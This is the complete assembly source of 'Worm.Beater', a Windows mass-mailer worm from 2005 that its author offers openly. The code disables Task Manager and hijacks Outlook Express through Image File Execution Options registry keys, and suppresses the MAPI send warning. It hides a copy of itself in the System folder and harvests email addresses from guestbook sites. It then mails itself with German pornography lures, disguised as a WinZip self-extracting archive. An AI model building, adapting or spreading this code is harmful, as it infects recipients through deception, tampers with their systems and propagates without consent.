;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Worm.Beater                                             ;
; coded by DiA/rrlf                                       ;
; http://www.vx-dia.de.vu                                 ;
; DiA_hates_machine@gmx.de                                ;
; ####################################################### ;
;                                                         ;
; intro:                                                  ;
; Hello and welcome to my first mass mailer worm. Nothin  ;
; really special, just for experience and just another    ;
; step at my ladder. Already detected by some AV's as     ;
; "Bater". Have fun...                                    ;
;                                                         ;
; disclaimer:                                             ;
; This is a source code of a workin worm! I am NOT        ;
; responsible for any executable file you making with     ;
; this! Please don't spread any viruses or worms, and     ;
; take care...                                            ;
;                                                         ;
; features:                                               ;
; -Disable task manager at execution, by using the        ;
;  "Image File Execution" trapping method. Simple put     ;
;  some text, and task manager can't run, how easy can    ;
;  it be. Enable it by termination.                       ;
; -Disable Outlook MAPI warning, already seen in other    ;
;  worms, just manipulating registry.                     ;
; -Copy worm to System directory under the name "btr.exe" ;
;  and set's "hide" attribute.                            ;
; -Trap Outlook Express using the "Image File Execution"  ;
;  trapping method. Means that when Outlook Express gets  ;
;  startet the worm will start too.                       ;
; -If worm is started somewhere else it shows a "real     ;
;  fake" message box using "FormatMessageA" API.          ;
; -Get it's victim mail addresses from guestbook's by     ;
;  generating 5 random numbers. Then it looks like        ;
;  "http://xxxxx.netguestbook.com". Search for "mailto:"  ;
;  and makes valid mail addresses (replacing HTML code).  ;
; -Creates mail from 5 (german - because guestbooks are   ;
;  most time german) subject's and body's.                ;
; -Get attachment name from "www.fuckinfreemovies.com"    ;
;  (thx for the good job dudes ;)). Means everyday new    ;
;  attachment names. If this fails it use a static name.  ;
; -Send mails using the Simple MAPI.                      ;
; -Simple payload, on every Friday 13th it show's 100     ;
;  times a message box "Beat me! Beat me one more time    ;
;  please!!"                                              ;
;                                                         ;
; assemble:                                               ;
; Make executable with The Flatassembler.                 ;
;                                                         ;
; ####################################################### ;
;                                    DiA/rrlf - 09.03.05  ;
;                                                         ;;;;;;;;;;;;;;;;;;;;;;;;;
;**********************************************************************************
;**********beater.asm*****cut*****start********************************************
;**********************************************************************************
include "%fasminc%\win32ax.inc"

;#####beater main code###################################
section '.code' code readable writeable executable
Beater:
    mov ebx, 0d                 ;disable
    call EnDisableTaskMgr               ;task manager STRG+ALT+DEL

    call DisableMAPIWarn                ;disable outlook mapi send warning

    call InstallWorm                ;copy worm to system folder

    call WhatToDo                   ;start outlook or show error message?

    jmp Logon

    MAPISessionHandle   dd ?

Logon:
    invoke MAPILogon,\              ;create mapi session
           0,\
           0,\
           0,\
           0,\
           0,\
           MAPISessionHandle

GetMailAddress:
    call GetFirstAttachment             ;get attachment name from FFM

    call GetFirstMail               ;get first mail address
    cmp eax, 13666d                 ;error?
    jne LetTheRiotBegin

    invoke InternetCloseHandle,\            ;close handle and get valid book
           dword [GuestFileHandle]

    invoke InternetCloseHandle,\
           dword [GuestInetHandle]

    jmp GetMailAddress

LetTheRiotBegin:
    call MakeMailValid              ;make a valid mail address

    cmp dword [VictimMail], "team"
    je ExitBeater                   ;dont send mail to team from netguestbook

    call GetSubjectBody             ;get a body & subject

    invoke MAPISendMail,\               ;send it baby
           dword [MAPISessionHandle],\
           0,\
           Message,\                ;MAPI message structure
           0,\
           0

    call GetNextMail                ;get next mail
    cmp eax, 13666d
    je ExitBeater

    call GetNextAttachment

    jmp LetTheRiotBegin

ExitBeater:
    invoke MAPILogoff,\             ;close mapi session
           dword [MAPISessionHandle],\
           0,\
           0,\
           0

    invoke InternetCloseHandle,\
           dword [GuestFileHandle]

    invoke InternetCloseHandle,\
           dword [GuestInetHandle]

    invoke InternetCloseHandle,\
           dword [AttFileHandle]

    invoke InternetCloseHandle,\
           dword [AttInetHandle]

    call Payload                    ;check for payload date

    mov ebx, 1d                 ;enable
    call EnDisableTaskMgr               ;task manager

    invoke ExitProcess,\
           0
;#####beater main code###################################

;#####en/disable task manager############################
EnDisableTaskMgr:
    jmp EnDisableTaskMgrGo

    RegFileExecution    db "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",0
    RegFileExHandle     dd ?
    RegTaskMgr      db "taskmgr.exe",0
    RegTaskMgrHandle    dd ?
    RegDebugger     db "Debugger",0
    RegDisable      db "Worm.Beater_DiA/rrlf",0
    RegEnable       db "",0

EnDisableTaskMgrGo:
    invoke RegOpenKeyEx,\               ;open key
           HKEY_LOCAL_MACHINE,\         ;-ebx -> 1 = enable 0 = disable
           RegFileExecution,\           ;-edx -> Buffer
           0,\                  ;-ecx -> length
           KEY_ALL_ACCESS,\
           RegFileExHandle

    cmp eax, 0
    jne EnDisableTaskMgrError

    invoke RegCreateKey,\               ;create key
           dword [RegFileExHandle],\
           RegTaskMgr,\
           RegTaskMgrHandle

    cmp eax, 0
    jne EnDisableTaskMgrError

    cmp ebx, 0
    je Disable

Enable:
    mov edx, RegEnable
    mov ecx, 1d
    jmp SetValue

Disable:
    mov edx, RegDisable
    mov ecx, 21d

SetValue:
    invoke RegSetValueEx,\              ;create value "Debugger"
           dword [RegTaskMgrHandle],\
           RegDebugger,\
           0,\
           REG_SZ,\
           edx,\                    ;simply put some text
           ecx

EnDisableTaskMgrError:
    invoke RegCloseKey,\                ;close key
           dword [RegTaskMgrHandle]

    invoke RegCloseKey,\
           dword [RegFileExHandle]
ret
;#####en/disable task manager############################

;#####disable mapi warning###############################
DisableMAPIWarn:
    jmp DisableMAPIWarnGo

    WarnIdentities      db "Identities",0
    WarnRegHandle       dd ?
    WarnDefaultUserValue    db "Default User ID",0
    WarnOutlookKey      db "\Software\Microsoft\Outlook Express\5.0\Mail",0
    WarnDefaultUserID   rb 100d
    WarnDefaultSize     db 100d
    WarnRegHandle2      dd ?
    WarnMAPI        db "Warn on Mapi Send",0
    WarnDisable     dd 0

DisableMAPIWarnGo:
    invoke RegOpenKeyEx,\               ;open key
           HKEY_CURRENT_USER,\
           WarnIdentities,\
           0,\
           KEY_QUERY_VALUE,\
           WarnRegHandle

    cmp eax, 0
    jne DisableMAPIWarnError

    invoke RegQueryValueEx,\            ;read default user id
           dword [WarnRegHandle],\
           WarnDefaultUserValue,\
           0,\
           0,\
           WarnDefaultUserID,\
           WarnDefaultSize

    cmp eax, 0
    jne DisableMAPIWarnError

    invoke lstrcat,\                ;join 2 strings easy way
           WarnDefaultUserID,\
           WarnOutlookKey

    invoke RegOpenKeyEx,\               ;open next key
           dword [WarnRegHandle],\
           WarnDefaultUserID,\
           0,\
           KEY_SET_VALUE,\
           WarnRegHandle2

    cmp eax, 0
    jne DisableMAPIWarnError

    invoke RegSetValueEx,\
           dword [WarnRegHandle2],\
           WarnMAPI,\
           0,\
           REG_DWORD,\
           WarnDisable,\
           4d

    cmp eax, 0
    jne DisableMAPIWarnError

    invoke RegCloseKey,\
           dword [WarnRegHandle2]

    invoke RegCloseKey,\                ;close key
           dword [WarnRegHandle]

DisableMAPIWarnError:
ret
;#####disable mapi warning###############################

;#####install worm#######################################
InstallWorm:
    jmp InstallWormGo

    WormPath    rb 256d
    WormSystemPath  rb 256d

InstallWormGo:
    invoke GetModuleFileName,\          ;get path
           0,\
           WormPath,\
           256d

    cmp eax, 0
    je InstallWormError

    invoke GetSystemDirectory,\         ;get system path
           WormSystemPath,\
           256d

    cmp eax, 0
    je InstallWormError

    mov dword [WormSystemPath + eax], "\btr"    ;make install full path
    mov dword [WormSystemPath + eax + 4d], ".exe"

    invoke CopyFile,\               ;copy worm
           WormPath,\
           WormSystemPath,\
           TRUE

    cmp eax, 0
    je InstallWormError

    invoke SetFileAttributes,\          ;hide worm copy
           WormSystemPath,\
           FILE_ATTRIBUTE_HIDDEN

InstallWormError:
ret
;#####install worm#######################################

;#####start outlook or show error########################
WhatToDo:
    jmp WhatToDoGo

    WhatFakeApp db "Beater",0
    StartupInfo STARTUPINFO
    ProcessInfo PROCESS_INFORMATION
    WhatFakeMsg rb 256d
    WhatOutlookPath rb 256d

WhatToDoGo:
    invoke GetCommandLine               ;get commandline
    inc eax                     ;go behind the first "

GetEndCmdLine:
    cmp byte [eax], '"'
    je HaveEndCmdLine

    inc eax
    jmp GetEndCmdLine

HaveEndCmdLine:
    inc eax
    cmp byte [eax], " "             ;is there a parameter?
    jne ExecuteOutlook              ;the exract & execute

FakeError:
    invoke CreateProcess,\              ;run non existing app
           WhatFakeApp,\                ;just to create error msg
           0,\
           0,\
           0,\
           0,\
           CREATE_NEW_CONSOLE,\
           0,\
           0,\
           StartupInfo,\
           ProcessInfo

    invoke GetLastError             ;get error handle

    invoke FormatMessage,\              ;create fake message
           FORMAT_MESSAGE_FROM_SYSTEM,\     ;greets to Bumblebee for this
           0,\
           eax,\                    ;last error
           0,\
           WhatFakeMsg,\
           256d,\
           0

    invoke MessageBox,\             ;show fake error
           0,\
           WhatFakeMsg,\
           0,\
           MB_ICONERROR

    mov ebx, 0d                 ;trap
    call UnTrapOutlook              ;trap outlook

    jmp WhatToDoError

ExecuteOutlook:
    mov esi, eax
    mov edi, WhatOutlookPath
    xor eax, eax

CopyOutlookPath:
    lodsb

    cmp byte [esi], '"'
    je HaveOutlookPath

    stosb
    jmp CopyOutlookPath

HaveOutlookPath:
    stosb

    mov ebx, 1d                 ;untrap
    call UnTrapOutlook              ;untrap to execute

    invoke CreateProcess,\              ;run outlook
           WhatOutlookPath,\
           0,\
           0,\
           0,\
           0,\
           CREATE_NEW_CONSOLE,\
           0,\
           0,\
           StartupInfo,\
           ProcessInfo

    cmp eax, 0                  ;on error
    je FakeError                    ;also show fake error

    mov ebx, 0d                 ;trap
    call UnTrapOutlook              ;trap outlook again

WhatToDoError:
ret
;#####start outlook or show error########################

;#####un/trap outlook####################################
UnTrapOutlook:
    jmp UnTrapOutlookGo

    TrapOutlook     db "msimn.exe",0
    TrapOutlookHandle   dd ?

UnTrapOutlookGo:
    invoke RegOpenKeyEx,\               ;open key
           HKEY_LOCAL_MACHINE,\
           RegFileExecution,\
           0,\
           KEY_ALL_ACCESS,\
           RegFileExHandle

    cmp eax, 0
    jne UnTrapOutlookError

    invoke RegCreateKey,\               ;create key
           dword [RegFileExHandle],\
           TrapOutlook,\
           TrapOutlookHandle

    cmp eax, 0
    jne UnTrapOutlookError

    cmp ebx, 1d                 ;-ebx -> 0 = trap 1 = untrap
    je Untrap                   ;-edx -> buffer
                            ;-ecx -> length
    invoke lstrlen,\                ;get length, the easy way ;)
           WormSystemPath

    inc eax                     ;including the 0

    mov edx, WormSystemPath
    mov ecx, eax
    jmp TrapIt

Untrap:
    mov edx, RegEnable              ;""
    mov ecx,1d

TrapIt:
    invoke RegSetValueEx,\              ;"Debugger"
           dword [TrapOutlookHandle],\
           RegDebugger,\
           0,\
           REG_SZ,\
           edx,\                    ;worm path
           ecx

UnTrapOutlookError:
    invoke RegCloseKey,\                ;close key
           dword [TrapOutlookHandle]

    invoke RegCloseKey,\
           dword [RegFileExHandle]
ret
;#####un/trap outlook####################################

;#####get first mail address#############################
GetFirstMail:
    jmp GetFirstMailGo

    GuestConnected      dd 0
    GuestIdent      db "Beater",0
    GuestInetHandle     dd ?
    GuestFileHandle     dd ?
    GuestCurrentByte    rb 2d
    GuestBytesRead      dd ?

    MailAddress     rb 100d

GetFirstMailGo:
    invoke InternetGetConnectedState,\      ;not connected?
           dword [GuestConnected],\         ;then no action
           0

    cmp eax, 1
    jne ExitBeater                  ;simply exit

    invoke InternetOpen,\               ;get inet handle
           GuestIdent,\
           0,\
           0,\
           0,\
           0

    mov dword [GuestInetHandle], eax

    cmp eax, 0
    je ExitBeater                   ;no book, no mails, no mm

    call MakeGuestbookURL               ;get url

    invoke InternetOpenUrl,\
           dword [GuestInetHandle],\
           GuestbookHTTP,\              ;http://xxxxx.netguestbook.com
           0,\
           0,\
           10h,\                    ;INTERNET_FLAG_NEED_FILE
           0

    mov dword [GuestFileHandle], eax

    cmp eax, 0
    je ExitBeater

GetFirstStartByte:
    invoke InternetReadFile,\           ;read byte
           dword [GuestFileHandle],\
           GuestCurrentByte,\           ;just one
           1d,\                 ;because InetSetFilePtr dont worked
           GuestBytesRead               ;for me, so improve baby :)

    cmp eax, 0
    je ExitBeater

    cmp byte [GuestCurrentByte], "t"        ;to:
    je GetSecondStartByte

    cmp byte [GuestCurrentByte], "/"        ;/HTML -> end
    je CheckFirstEOF

    cmp byte [GuestCurrentByte], "b"        ;invalid -> b>»
    je CheckFirstInvalid

    jmp GetFirstStartByte

GetSecondStartByte:
    invoke InternetReadFile,\           ;read next byte
           dword [GuestFileHandle],\
           GuestCurrentByte,\
           1d,\
           GuestBytesRead

    cmp eax, 0
    je ExitBeater

    cmp byte [GuestCurrentByte], "o"
    je GetThirdStartByte

    jmp GetFirstStartByte

GetThirdStartByte:
    invoke InternetReadFile,\           ;get last :
           dword [GuestFileHandle],\
           GuestCurrentByte,\
           1d,\
           GuestBytesRead

    cmp eax, 0
    je ExitBeater

    cmp byte [GuestCurrentByte], ":"        ;mailto:
    je HaveFirstMailStart

    jmp GetFirstStartByte

CheckFirstEOF:
    invoke InternetReadFile,\
           dword [GuestFileHandle],\
           GuestCurrentByte,\
           1d,\
           GuestBytesRead

    cmp eax, 0
    je ExitBeater

    cmp byte [GuestCurrentByte], "H"        ;/HTML
    je CheckSecondEOF

    jmp GetFirstStartByte

CheckSecondEOF:
    invoke InternetReadFile,\           ;chek next
           dword [GuestFileHandle],\
           GuestCurrentByte,\
           1d,\
           GuestBytesRead

    cmp eax, 0
    je ExitBeater

    cmp byte [GuestCurrentByte], "T"
    je GetFirstMailError

    jmp GetFirstStartByte

CheckFirstInvalid:
    invoke InternetReadFile,\           ;check for invalid sites
           dword [GuestFileHandle],\
           GuestCurrentByte,\
           1d,\
           GuestBytesRead

    cmp eax, 0
    je ExitBeater

    cmp byte [GuestCurrentByte], ">"        ;b>»
    je CheckSecondInvalid

    jmp GetFirstStartByte

CheckSecondInvalid:
    invoke InternetReadFile,\
           dword [GuestFileHandle],\
           GuestCurrentByte,\
           1d,\
           GuestBytesRead

    cmp eax, 0
    je ExitBeater

    cmp byte [GuestCurrentByte], "»"        ;b>»
    je GetFirstMailError

    jmp GetFirstStartByte

HaveFirstMailStart:
    mov edi, MailAddress

CopyFirstMail:
    invoke InternetReadFile,\           ;get byte to copy
           dword [GuestFileHandle],\
           GuestCurrentByte,\
           1d,\
           GuestBytesRead

    cmp eax, 0
    je ExitBeater

    cmp byte [GuestCurrentByte], '"'        ;" = end of mail
    je GetFirstMailReturn

    mov esi, GuestCurrentByte
    movsb                       ;copy byte from esi to edi
    jmp CopyFirstMail

GetFirstMailError:
    mov eax, 13666d                 ;set error code

GetFirstMailReturn:
ret
;#####get first mail address#############################

;#####get next mail address##############################
GetNextMail:
    mov edi, VictimMail             ;free buffer
    mov ecx, 100d
    mov al, 0
    rep stosb

    mov edi, MailAddress                ;free buffer
    mov ecx, 100d
    mov al, 0
    rep stosb

    call GetFirstStartByte              ;extract mail
ret
;#####get next mail address##############################

;#####make random guestbook url##########################
MakeGuestbookURL:
    jmp MakeGuestbookURLGo

    GuestbookHTTP   db "http://"
    GuestbookCode   rb 5d
    GuestbookNet    db ".netguestbook.com/",0

MakeGuestbookURLGo:
    xor ecx, ecx
    push ecx
    mov edi, GuestbookCode

GetNextNumber:
    pop ecx
    cmp ecx, 5d
    je HaveGuestbookURL
    push ecx

    xor ebx, ebx
    mov bl, al

    invoke Sleep,\
           ebx                  ;sleep a little bit

    invoke GetTickCount             ;how long is pc running

IsNumberValid:
    cmp al, 49d                 ;smaller then "0"
    jb DigitAdd

    cmp al, 57d                 ;greater then "9"
    ja DigitSub

    jmp NumberIsValid

DigitAdd:
    add al, 6d                  ;make it valid
    jmp IsNumberValid

DigitSub:
    sub al, 6d                  ;valid
    jmp IsNumberValid               ;check again

NumberIsValid:
    stosb                       ;save number

    pop ecx
    inc ecx
    push ecx
    jmp GetNextNumber               ;next until 5

HaveGuestbookURL:
ret
;#####make random guestbook url##########################

;#####make mail address valid############################
MakeMailValid:
    jmp MakeMailValidGo

    VictimMail  rb 100d             ;who care about size? me not

MakeMailValidGo:
    mov esi, MailAddress                ;they use tricks for anti-spam
    mov edi, VictimMail             ;@ = @   . = .

FindAt:
    cmp dword [esi], "@"
    je HaveAt

    movsb
    jmp FindAt

HaveAt:
    mov al, "@"
    stosb                       ;set @
    add esi, 5d                 ;go behind ;

FindPoint:
    cmp dword [esi], "."
    je HavePoint

    movsb
    jmp FindPoint

HavePoint:
    mov al, "."
    stosb
    add esi, 5d

CopyRest:
    cmp byte [esi], 0
    je CopyDone

    movsb
    jmp CopyRest

CopyDone:
ret
;#####make mail address valid############################

;#####get one of five subjects & bodys###################
GetSubjectBody:
    jmp GetSubjectBodyGo

    CRLF        equ 0Dh,0Ah

    Subject1    db "WOW!",0
    Subject2    db "Schau dir das an...",0
    Subject3    db "Super Bilder fuer dich ;)",0
    Subject4    db "Nen versautes Geschenk fuer dich!",0
    Subject5    db "Picture Set",0

    Body1       db "Hi!",CRLF
            db "bin neulich im internet rumgesurft und habe ne seite gefunden",CRLF
            db "da gabs ne menge kostenlose porno bilder. Leider hab ich den",CRLF
            db "namen vergessen... :/",CRLF
            db "Aber ich habe mir ein paar schon runtergeladen. Ich habs drangehaengt",CRLF
            db "als selbst-extrahierendes archiv :D",CRLF,CRLF
            db "na dann, viel spass... ;)",0
    Body2       db "Hey",CRLF
            db "schau was ich für nen saugeiles picture set gefunden habe!!!!",0
    Body3       db "Hallo,",CRLF
            db "na, hat dich die Betreffzeile schon neugierig gemacht?",CRLF
            db "Wenn ja dann solltest du dir UNBEDINGT die kostenlosen",CRLF
            db "Bilder anschauen die als Attachment dieser Nachricht folgen.",CRLF,CRLF,CRLF
            db "(c)2005 by HardcoreBabez",CRLF
            db "________________________",0
    Body4       db "Ich will dir nicht zu viel verraten ;D",CRLF
            db "Schau dir einfach die Bilder an und sag mir was du davon haeltst!",0
    Body5       db "Man schau dir die Bilder Sammlung an...",CRLF
            db "So etwas wuerd ich auch gern mal erleben!",CRLF,CRLF
            db "Schoene Grueße, B.",0

GetSubjectBodyGo:
    invoke GetTickCount

    cmp al, 51d
    jb SetSubject1

    cmp al, 102d
    jb SetSubject2

    cmp al, 153d
    jb SetSubject3

    cmp al, 204d
    jb SetSubject4

SetSubject5:
    mov dword [lpszSubject], Subject5
    jmp SetBody

SetSubject4:
    mov dword [lpszSubject], Subject4
    jmp SetBody

SetSubject3:
    mov dword [lpszSubject], Subject3
    jmp SetBody

SetSubject2:
    mov dword [lpszSubject], Subject2
    jmp SetBody

SetSubject1:
    mov dword [lpszSubject], Subject1

SetBody:
    xor ebx, ebx
    mov bl, al
    invoke Sleep,\
           ebx

    invoke GetTickCount

    cmp al, 51d
    jb SetBody1

    cmp al, 102d
    jb SetBody2

    cmp al, 153d
    jb SetBody3

    cmp al, 204d
    jb SetBody4

SetBody5:
    mov dword [lpszNoteText], Body5
    jmp HaveMessage

SetBody4:
    mov dword [lpszNoteText], Body4
    jmp HaveMessage

SetBody3:
    mov dword [lpszNoteText], Body3
    jmp HaveMessage

SetBody2:
    mov dword [lpszNoteText], Body2
    jmp HaveMessage

SetBody1:
    mov dword [lpszNoteText], Body1

HaveMessage:
ret
;#####get one of five subjects & bodys###################

;#####mapi message structure#############################
Message:
    ulReservedm     dd 0
    lpszSubject     dd 0            ;Subject
    lpszNoteText        dd 0            ;Body
    lpszMessageType     dd 0
    lpszDateReceived    dd 0
    lpszConversationID  dd 0
    flFlags         dd 0
    lpOriginator        dd Recip2
    nRecipCount     dd 1
    lpRecips        dd Recip
    nFileCount      dd 1
    lpFiles         dd Files

Recip:
    ulReservedr     dd 0
    ulRecipClass        dd 1
    lpszName        dd 0            ;Name
    lpszAddress     dd VictimMail       ;Address
    ulEIDSize       dd 0
    lpEntryID       dd 0

Recip2:
    ulReservedr2        dd 0
    ulRecipClass2       dd 0
    lpszName2       dd 0
    lpszAddress2        dd 0
    ulEIDSize2      dd 0
    lpEntryID2      dd 0

Files:
    ulReservedf     dd 0
    flFlags2        dd 0
    nPosition       dd 0
    lpszPathName        dd WormPath     ;FilePath
    lpszFileName        dd AttachmentName   ;FileName
    lpFileType      dd 0
;#####mapi message structure#############################

;#####get first attachment name##########################
GetFirstAttachment:
    jmp GetFirstAttachmentGo

    AttIdent        db "DiA/rrlf",0
    AttInetHandle       dd ?
    AttFFM          db "http://www.fuckingfreemovies.com/index.html",0
    AttReadFiles        dd ?
    AttFileHandle       dd ?
    AttCurrentByte      rb 2d
    AttSimpleName       db "Hot Lebian Picture Set.exe",0
    AttNames        rb 351d
    AttachmentName      rb 50d

GetFirstAttachmentGo:
    invoke InternetOpen,\               ;open inet
           AttIdent,\
           0,\
           0,\
           0,\
           0

    mov dword [AttInetHandle], eax

    cmp eax, 0                  ;on error set simple name
    je SetSimpleName

    invoke InternetOpenUrl,\            ;open site
           dword [AttInetHandle],\
           AttFFM,\
           0,\
           0,\
           10h,\
           0

    mov dword [AttFileHandle], eax

    cmp eax, 0
    je SetSimpleName

    xor esi, esi                    ;skip unused stuff
SkipHeader:                     ;fuckin InternetSetFilePointer
    cmp esi, 22995d
    je ReadAttName

    invoke InternetReadFile,\           ;read just one byte
           dword [AttFileHandle],\          ;improve setfilepointer
           AttCurrentByte,\
           1d,\
           AttReadFiles

    inc esi
    jmp SkipHeader

ReadAttName:
    invoke InternetReadFile,\           ;read a name
           dword [AttFileHandle],\
           AttNames,\               ;buffer
           350d,\                   ;maybe long url...
           AttReadFiles

    mov esi, AttNames               ;extract name

FindNameStart:
    cmp dword [esi], "s=''"
    je HaveNameStart

    inc esi
    jmp FindNameStart

HaveNameStart:
    mov edi, AttachmentName
    add esi, 8d

CopyName:
    cmp byte [esi], "<"
    je CopyNameDone

    movsb
    jmp CopyName

CopyNameDone:
    mov dword [edi], ".exe"
    jmp GetFirstAttachmentReturn

SetSimpleName:
    mov dword [lpszFileName], AttSimpleName

GetFirstAttachmentReturn:
ret
;#####get first attachment name##########################

;#####get next attachment################################
GetNextAttachment:
    mov edi, AttachmentName             ;free buffer
    mov ecx, 50d
    mov al, 0
    rep stosb

    call ReadAttName
ret
;#####get next attachment################################

;#####check for payload date & run it####################
Payload:
    jmp PayloadGo

    SystemTime      SYSTEMTIME

PayloadGo:
    invoke GetSystemTime,\              ;get date
           SystemTime

    cmp word [SystemTime.wDayOfWeek], 5d        ;friday?
    jne PayloadDone

    cmp word [SystemTime.wDay], 13d         ;the 13th
    jne PayloadDone

    mov esi, 113d                   ;113 x beat

BeatMe:
    cmp esi, 0
    je HaaSweet

    invoke MessageBox,\             ;show little msgbox
           0,\
           "Beat me! Beat me one more time please!!",\
           "Worm.Beater by DiA/rrlf",\
           MB_ICONEXCLAMATION

    dec esi
    jmp BeatMe

HaaSweet:
    invoke MessageBox,\
           0,\
           "That was nice, no?",\
           "D i A / r r l f",\
           MB_ICONINFORMATION

PayloadDone:
ret
;#####check for payload date & run it####################

;#####needed apis########################################
section '.idata' import data readable writeable
    library kernel32,         "KERNEL32.DLL",\
        user32,           "USER32.DLL",\
        advapi32,         "ADVAPI32.DLL",\
        wininet,          "WININET.DLL",\
        mapi32,           "MAPI32.DLL"

    import kernel32,\
           GetCommandLine,        "GetCommandLineA",\
           CreateProcess,         "CreateProcessA",\
           GetLastError,          "GetLastError",\
           FormatMessage,         "FormatMessageA",\
           GetModuleFileName,     "GetModuleFileNameA",\
           GetSystemDirectory,    "GetSystemDirectoryA",\
           CopyFile,          "CopyFileA",\
           SetFileAttributes,     "SetFileAttributesA",\
           lstrlen,           "lstrlenA",\
           lstrcat,           "lstrcatA",\
           Sleep,             "Sleep",\
           GetTickCount,          "GetTickCount",\
           GetSystemTime,         "GetSystemTime",\
           ExitProcess,       "ExitProcess"

    import user32,\
           MessageBox,        "MessageBoxA"

    import advapi32,\
           RegOpenKeyEx,          "RegOpenKeyExA",\
           RegQueryValueEx,       "RegQueryValueExA",\
           RegCreateKey,          "RegCreateKeyA",\
           RegSetValueEx,         "RegSetValueExA",\
           RegCloseKey,       "RegCloseKey"

    import wininet,\
           InternetGetConnectedState, "InternetGetConnectedState",\
           InternetOpen,          "InternetOpenA",\
           InternetOpenUrl,       "InternetOpenUrlA",\
           InternetReadFile,      "InternetReadFile",\
           InternetCloseHandle,   "InternetCloseHandle"

    import mapi32,\
           MAPILogon,         "MAPILogon",\
           MAPISendMail,          "MAPISendMail",\
           MAPILogoff,        "MAPILogoff"
;#####needed apis########################################

;#####resources, little bit faked########################
section '.rsrc' resource data readable
    directory RT_VERSION, versions,\
          RT_ICON, icons,\
          RT_GROUP_ICON, group_icons

    resource versions,\
         1,\
         LANG_NEUTRAL,\
         version_info

    resource icons,\
         1,\
         LANG_NEUTRAL,\
         icon_data

    resource group_icons,\
         17,\
         LANG_NEUTRAL,\
         main_icon

    version version_info,\
        VOS__WINDOWS32,VFT_APP,VFT2_UNKNOWN,LANG_ENGLISH+SUBLANG_DEFAULT,0,\
        "FileDescription", "WinZip Selbst-Extrahierendes Archiv",\
        "LegalCopyright", "(c)2005 WinZip",\
        "FileVersion", "1.0",\
        "OriginalFilename", "NEW_PICTURE_SET_selfextract.exe"

    icon main_icon,\
         icon_data,\
         "Beater.ico"
;#####resources, little bit faked########################
;**********************************************************************************
;**********beater.asm*****cut*****end**********************************************
;**********************************************************************************
